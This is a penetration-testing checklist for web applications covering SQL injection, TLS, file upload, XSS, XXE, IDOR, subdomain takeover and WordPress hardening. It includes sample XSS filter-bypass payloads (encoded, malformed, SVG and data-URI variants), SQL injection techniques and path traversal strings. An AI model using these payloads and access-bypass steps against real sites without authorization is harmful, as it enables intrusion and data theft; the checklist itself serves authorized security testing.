- [ ] **Tautologies:** Inject tautologies like 1=1 or a=a into input fields or URL parameters to test for boolean-based SQLi.

- [ ] **Union-based SQLi:** Use the UNION operator to combine the results of two or more SELECT statements and extract data from other tables.

- [ ] **Error-based SQLi:** Inject incorrect syntax or invalid input to trigger error messages that reveal database structure or sensitive information.

- [ ] **Time-based SQLi:** Inject time-delaying functions like SLEEP() or WAITFOR DELAY to test for time-based SQLi vulnerabilities.

- [ ] **Out-of-band (OOB) SQLi:** Test for OOB SQLi by injecting payloads that cause the database to make external requests, such as DNS lookups or HTTP requests, to exfiltrate data.

- [ ] **Double encoding:** Test with double-encoded payloads to bypass filters that only decode input once. Example: %253Cscript%253Ealert(1)%253C%252Fscript%253E.

- [ ] **Use SQL comment characters:** Inject SQL comment characters (--, /*, */) to bypass input filters or terminate SQL statements.

- [ ] **Manipulate query logic:** Inject logical operators such as AND or OR to manipulate the query's logic and bypass access controls.

- [ ] **Test with different SQL dialects:** Use payloads specific to different SQL dialects (e.g., MySQL, PostgreSQL, Oracle, or MSSQL) to identify database-specific vulnerabilities.

- [ ] **Test various HTTP methods:** Test for SQLi vulnerabilities using different HTTP methods, such as POST, PUT, or PATCH, with SQLi payloads.

- [ ] **Test with URL-encoded or base64-encoded parameters:** Try URL-encoded or base64-encoded parameters to bypass input validation or access control checks.

- [ ] **Test various content types:** Test for SQLi vulnerabilities in different content types that support user input, such as JSON, XML, or URL-encoded form data.

- [ ] **Manipulate cookies:** Inject SQL payloads into cookies to test if the application processes them in an unsafe manner.

- [ ] **Use web application scanners:** Use automated web application scanners, such as Burp Suite or OWASP ZAP, to identify potential SQLi vulnerabilities.

## TLS Vulnerability

- [ ] **Weak or outdated SSL/TLS protocols:** Ensure your site only supports secure and up-to-date protocols like TLS 1.2 and TLS 1.3, and disable insecure ones like SSL 2.0, SSL 3.0, and TLS 1.0.

- [ ] **Insecure cipher suites:** Disable weak cipher suites and use strong ones, such as those based on AES-GCM, ChaCha20-Poly1305, or ECDHE (Elliptic Curve Diffie-Hellman).

- [ ] **Vulnerability to known attacks:** Protect your site from known TLS attacks, such as POODLE, BEAST, CRIME, BREACH, or Heartbleed, by applying security patches and following best practices.

- [ ] **Inadequate certificate management:** Use a valid, trusted, and up-to-date SSL/TLS certificate from a reputable Certificate Authority (CA). Regularly check for certificate expiration and renewals.

- [ ] **Insufficient certificate chain validation:** Ensure proper validation of the certificate chain to prevent man-in-the-middle attacks using rogue or misissued certificates.

- [ ] **Weak or missing public key pinning:** Implement HTTP Public Key Pinning (HPKP) or Certificate Transparency to enforce the use of specific public keys and reduce the risk of man-in-the-middle attacks using rogue certificates.

- [ ] **Mixed content:** Ensure that all content, including images, stylesheets, and scripts, are served over HTTPS to prevent mixed content warnings and potential attacks.

- [ ] **Insecure renegotiation:** Disable insecure client-initiated renegotiation to protect your site from man-in-the-middle attacks exploiting this vulnerability.

- [ ] **Insufficient forward secrecy:** Use cipher suites that support forward secrecy, such as ECDHE or DHE, to protect past communications from being decrypted even if the server's private key is compromised.

- [ ] **Lack of OCSP stapling:** Implement OCSP (Online Certificate Status Protocol) stapling to reduce the latency of SSL/TLS handshakes and provide real-time certificate revocation information.

## File Upload

- [ ] **File size limit:** Verify that there is an appropriate file size limit in place to prevent large file uploads that could potentially exhaust server resources.

- [ ] **File type restrictions:** Ensure that only allowed file types can be uploaded, and test with disallowed file types to confirm the restrictions are working.

- [ ] **MIME type validation:** Check that the MIME type of uploaded files is being validated and that the system rejects files with incorrect MIME types.

- [ ] **Filename validation:** Test that the system filters and sanitizes filenames to avoid malicious filenames (e.g., "../", ".htaccess") that could lead to security vulnerabilities.

- [ ] **Malware scanning:** Scan uploaded files for malware or viruses using an up-to-date antivirus solution.

- [ ] **Duplicate file names:** Test how the system handles duplicate file names, ensuring that it doesn't overwrite existing files or create security vulnerabilities.

- [ ] **Upload directory:** Verify that the upload directory is secured and not accessible for unauthorized users.

- [ ] **Permissions:** Ensure that proper file and folder permissions are set to prevent unauthorized access, modification, or deletion of uploaded files.

- [ ] **User authentication:** Test if file uploads require proper user authentication and that unauthorized users cannot upload files.

- [ ] **Image validation:** If uploading images, test for potential vulnerabilities related to image processing libraries (e.g., buffer overflows, code injection).

- [ ] **File content validation:** Ensure that the content of the files is validated and doesn't contain malicious code or scripts.

- [ ] **Maximum file uploads:** Test the maximum number of simultaneous file uploads to ensure the system can handle the load without crashing or compromising security.

- [ ] **Timeouts:** Test the system for handling long uploads and confirm that it has appropriate timeouts in place.

- [ ] **Rate limiting:** Verify that the system has rate limiting in place to prevent abuse and denial of service (DoS) attacks.

- [ ] **Error handling:** Test the system's error handling capabilities to ensure that it doesn't leak sensitive information or create security vulnerabilities.

- [ ] **Cross-site scripting (XSS):** Test for potential XSS vulnerabilities related to file uploads, such as the inclusion of malicious scripts within file metadata.

- [ ] **Path traversal:** Test for path traversal vulnerabilities by attempting to upload files with directory traversal characters (e.g., "../") in the file name.

- [ ] **SQL injection:** Test for potential SQL injection vulnerabilities related to file uploads, such as manipulating metadata to include malicious SQL queries.

- [ ] **Access control:** Verify that proper access controls are in place for viewing, editing, or deleting uploaded files.

- [ ] **Logging and monitoring:** Ensure that the system logs and monitors all file upload activities for potential security threats and suspicious behavior.

## XSS

- [ ] **Basic payload injection:** Inject simple script tags or HTML tags with JavaScript event handlers into input fields or query parameters. Example: <script>alert(1)</script> or <img src=x onerror=alert(1)>.

- [ ] **URL encoding:** Use URL-encoded payloads to bypass input filters that may block certain characters. Example: %3Cscript%3Ealert(1)%3C%2Fscript%3E.

- [ ] **Hex encoding:** Test with hex-encoded payloads to bypass filters that block specific characters. Example: <scr\x69pt>alert(1)</scr\x69pt>.

- [ ] **Case variation:** Try different letter casing to bypass case-sensitive filters. Example: <ScRiPt>alert(1)</ScRiPt>.

- [ ] **HTML entity encoding:** Inject payloads with HTML entities to evade filters that remove or escape specific characters. Example: &lt;script&gt;alert(1)&lt;/script&gt;.

- [ ] **Null byte injection:** Use null bytes to break out of input restrictions or bypass filters. Example: <scr%00ipt>alert(1)</scr%00ipt>.

- [ ] **Double encoding:** Test with double-encoded payloads to bypass filters that only decode input once. Example: %253Cscript%253Ealert(1)%253C%252Fscript%253E.

- [ ] **Attribute injection:** Attempt to inject payloads within existing HTML tags by closing the current attribute and adding a new one with malicious JavaScript. Example: "><img src=x onerror=alert(1)>.

- [ ] **JavaScript event handlers:** Inject JavaScript event handlers, such as onmouseover, onfocus, or onclick, into various HTML elements to trigger the payload.

- [ ] **Malformed tags:** Test with malformed tags to bypass filters that look for well-formed HTML. Example: <scrip<script>t>alert(1)</scrip</script>t>.

- [ ] **Using different contexts:** Test payloads in various contexts, such as HTML comments, inline JavaScript, or CSS, to bypass context-specific filters.

- [ ] **Data URI:** Inject data URI payloads to bypass certain input filters. Example: <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>.

- [ ] **SVG payloads:** Use Scalable Vector Graphics (SVG) payloads to execute JavaScript in a different context. Example: <svg onload="alert(1)"></svg>.

- [ ] **Breaking out of JavaScript:** Inject payloads that break out of existing JavaScript code and execute malicious scripts.

- [ ] **Testing error pages:** Check if error pages, such as 404 or 500, reflect user input without proper encoding, as these can be used for reflected XSS attacks.

## XXE

- [ ] **Basic external entity:** Inject a basic external entity reference to test if the parser resolves it

- [ ] **External parameter entity:** Inject an external parameter entity to bypass input filters. 

- [ ] **Blind XXE (OOB technique):** Use Out-of-Band (OOB) techniques to exfiltrate data if the response doesn't display the content of the external entity.

- [ ] **File inclusion:** Attempt to include local or remote files using the SYSTEM identifier to test for arbitrary file inclusion.

- [ ] **Internal entity expansion:** Inject an internal entity with a large number of nested entities to test for a Billion Laughs attack (a type of denial-of-service attack).

- [ ] **Recursive entity references:** Test for recursive entity expansion to identify potential denial-of-service (DoS) vulnerabilities.

- [ ] **XML bomb:** Inject a large XML file with deeply nested elements to test for XML bomb vulnerabilities, which can lead to DoS attacks.

- [ ] **Error-based XXE:** Inject malformed XML with external entity references to trigger errors that reveal sensitive information.

- [ ] **XML encoding:** Try different XML encodings (e.g., UTF-16, UTF-32) to bypass input filters that block specific characters.

- [ ] **Use CDATA sections:** Inject external entity references inside CDATA sections to bypass input filters that remove or escape specific characters.

- [ ] **Custom entities:** Create custom entities with external references to test if the XML parser resolves them.

- [ ] **Test various content types:** Test for XXE vulnerabilities in different content types that support XML, such as SOAP, XHTML, SVG, or RSS.

- [ ] **Test XML-based file formats:** Test for XXE vulnerabilities in XML-based file formats, such as Office Open XML (.docx, .pptx, .xlsx) or OpenDocument (.odt, .ods, .odp).

- [ ] **Test different HTTP methods:** Test for XXE vulnerabilities using different HTTP methods, such as POST, PUT, or PATCH, with XML payloads.

- [ ] **Test XML-based APIs:** Test for XXE vulnerabilities in XML-based APIs, such as XML-RPC or SOAP-based web services.

## IDOR

- [ ] **Sequential IDs:** Analyze sequential numeric IDs or predictable identifiers in URLs, API endpoints, or hidden form fields, and try modifying them to access unauthorized resources.

- [ ] **User-specific data:** Ensure proper authorization checks are in place for user-specific data, such as profiles, orders, or messages, by attempting to access another user's data using your authenticated session.

- [ ] **Enumerate identifiers:** Create multiple accounts with different roles (e.g., admin, user) and compare the object identifiers to identify patterns or correlations.

- [ ] **Test file uploads:** Test file upload functionality and attempt to access uploaded files by guessing or modifying their filenames.

- [ ] **Test API endpoints:** Analyze API endpoints for exposed object references and attempt to access unauthorized resources by modifying request parameters.

- [ ] **Test hidden form fields:** Examine hidden form fields for object references and modify their values to access unauthorized resources.

- [ ] **Test JSON or XML responses:** Analyze JSON or XML responses for exposed object references and attempt to access unauthorized resources by modifying request parameters.

- [ ] **Test related features:** Test related features or modules, such as password reset or email validation, for IDOR vulnerabilities by modifying request parameters.

- [ ] **Test with different roles:** Create accounts with different roles (e.g., admin, user, guest) and attempt to access unauthorized resources using different user sessions.

- [ ] **Test with unauthenticated sessions:** Test if unauthenticated users can access resources by modifying object references in URLs or API endpoints.

- [ ] **Use web application scanners:** Use automated web application scanners, such as Burp Suite or OWASP ZAP, to identify potential IDOR vulnerabilities.

- [ ] **Analyze access logs:** Review server access logs for patterns indicating unauthorized access attempts.

- [ ] **Manipulate cookies:** Manipulate cookies or session tokens to impersonate other users and attempt to access unauthorized resources.

- [ ] **Test request methods:** Test for IDOR vulnerabilities using different HTTP request methods, such as GET, POST, PUT, DELETE, or PATCH.

- [ ] **Test with URL-encoded or base64-encoded parameters:** Try URL-encoded or base64-encoded parameters to bypass input validation or access control checks.

## Subdomain Takeover

- [ ] **Enumerate subdomains:** Use tools like Sublist3r, Amass, or dnsrecon to discover subdomains associated with your main domain.

- [ ] **Analyze DNS records:** Check DNS records (e.g., CNAME, A, AAAA, MX) for subdomains pointing to external services or expired domains.

- [ ] **Check HTTP responses:** Examine HTTP responses for error messages or status codes that may indicate an unclaimed or expired external service.

- [ ] **Use online services:** Utilize online services such as crt.sh or Censys to gather subdomain and certificate data for your main domain.

- [ ] **Test common third-party services:** Check if subdomains are pointing to common third-party services, such as AWS S3, GitHub Pages, or Heroku, that are susceptible to subdomain takeover attacks.

- [ ] **Test for dangling CNAME records:** Look for dangling CNAME records that point to external services that have been deleted or expired.

- [ ] **Monitor domain registration:** Monitor domain registration information for expired domains that can be taken over.

- [ ] **Use subdomain takeover tools:** Utilize tools like SubOver, Subjack, or tko-subs to automatically identify subdomain takeover vulnerabilities.

- [ ] **Check for misconfigured DNS settings:** Examine DNS settings for misconfigurations that might lead to subdomain takeover vulnerabilities.

- [ ] **Test for wildcard DNS records:** Check for wildcard DNS records that might expose subdomains to takeover attacks.

- [ ] **Check for abandoned subdomains:** Look for abandoned subdomains that still point to unused external services.

- [ ] **Test for improper redirects:** Check if subdomains are improperly redirecting traffic to external services that can be taken over.

- [ ] **Monitor domain ownership changes:** Monitor domain ownership changes for potential takeover opportunities.

- [ ] **Collaborate with third-party service providers:** Work with third-party service providers to ensure proper domain configuration and prevent subdomain takeover.

- [ ] **Regularly audit subdomain configurations:** Periodically review your subdomain configurations to identify and mitigate potential subdomain takeover risks.

## Wordpress CMS

- [ ] **Keep WordPress updated:** Regularly update the WordPress core, plugins, and themes to protect against known vulnerabilities.

- [ ] **Test for weak passwords:** Ensure strong passwords are used for all user accounts, especially for administrator accounts.

- [ ] **Check for user enumeration:** Test if usernames can be enumerated through the WordPress author archives or other means, and disable user enumeration if possible.

- [ ] **Test for default admin username:** Ensure the default "admin" username is not used, and replace it with a custom username.

- [ ] **Limit login attempts:** Test if login attempts are limited to prevent brute-force attacks, and install a plugin like Login LockDown or Wordfence to enable this functionality if necessary.

- [ ] **Test for insecure file permissions:** Check the permissions of your WordPress files and folders to ensure they are secure and cannot be accessed by unauthorized users.

- [ ] **Test for XML-RPC vulnerabilities:** Test for vulnerabilities related to the XML-RPC feature, such as DDoS or brute-force attacks, and disable it if not needed.

- [ ] **Test for SQL injection vulnerabilities:** Test your WordPress site for SQL injection vulnerabilities by injecting SQL payloads into input fields or URL parameters.

- [ ] **Test for Cross-Site Scripting (XSS) vulnerabilities:** Test your WordPress site for XSS vulnerabilities by injecting JavaScript payloads into input fields or URL parameters.

- [ ] **Test for Cross-Site Request Forgery (CSRF) vulnerabilities:** Test your WordPress site for CSRF vulnerabilities by attempting to perform actions without a valid CSRF token or by using another user's authenticated session.

- [ ] **Test for vulnerable plugins:** Check for known vulnerabilities in your installed plugins using tools like WPScan or by regularly monitoring vulnerability databases.

- [ ] **Test for vulnerable themes:** Check for known vulnerabilities in your installed themes using tools like WPScan or by regularly monitoring vulnerability databases.

- [ ] **Test for insecure configurations:** Check your WordPress configuration (wp-config.php) for insecure settings, such as displaying errors, and secure it by disabling features like error reporting or file editing.

- [ ] **Check for security best practices:** Ensure your site follows WordPress security best practices, such as using HTTPS, disabling directory browsing, or setting secure HTTP headers.

- [ ] **Use a security plugin:** Install a comprehensive security plugin like Wordfence, iThemes Security, or Sucuri to monitor and protect your site from various threats.
